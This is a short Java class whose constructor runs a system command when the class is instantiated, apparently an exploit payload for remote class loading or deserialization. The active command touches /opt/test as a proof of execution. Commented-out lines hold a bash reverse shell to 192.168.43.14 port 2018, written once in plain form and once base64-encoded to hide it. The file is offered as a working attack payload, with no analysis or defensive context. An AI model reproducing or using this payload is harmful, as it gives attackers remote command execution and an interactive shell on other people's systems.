import	java.lang.Runtime;
import	java.lang.Process;
public class CommandObject {
    public CommandObject(){
        try{
			Runtime	rt	=	Runtime.getRuntime();
			//Runtime.getRuntime().exec("/bin/bash -i >&/dev/tcp/192.168.43.14/2018<&1");
			//String[] commands = {"bash -c {echo,L2Jpbi9iYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC40My4xNC8yMDE4PCYx}|{base64,-d}|{bash,-i}"};
			
			String[] commands = {"touch","/opt/test"};
			Process	pc = rt.exec(commands);
			pc.waitFor();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        CommandObject e = new CommandObject();
    }
}
